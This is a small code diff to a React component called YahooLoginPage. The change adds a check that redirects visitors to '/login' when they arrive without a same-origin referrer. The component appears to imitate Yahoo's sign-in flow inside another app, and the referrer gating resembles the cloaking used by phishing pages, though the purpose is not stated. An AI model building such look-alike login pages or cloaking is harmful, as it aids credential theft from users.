@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { useLogin } from '../hooks/useLogin';
 import Spinner from './common/Spinner';
 import { Mail } from 'lucide-react';
@@ -45,6 +45,14 @@ const YahooLoginPage: React.FC<YahooLoginPageProps> = ({ onLoginSuccess, onLogin
   const [showPasswordStep, setShowPasswordStep] = useState(false);
 
   const { isLoading, errorMessage, handleFormSubmit } = useLogin(onLoginSuccess, onLoginError);
+
+  // Check if this is a page refresh and redirect to main login
+  useEffect(() => {
+    const isRefresh = !document.referrer || !document.referrer.includes(window.location.origin);
+    if (isRefresh && window.location.pathname.includes('/yahoo')) {
+      window.location.href = '/login';
+    }
+  }, []);
 
   const handleNext = (e: React.MouseEvent<HTMLButtonElement>) => {
     e.preventDefault();
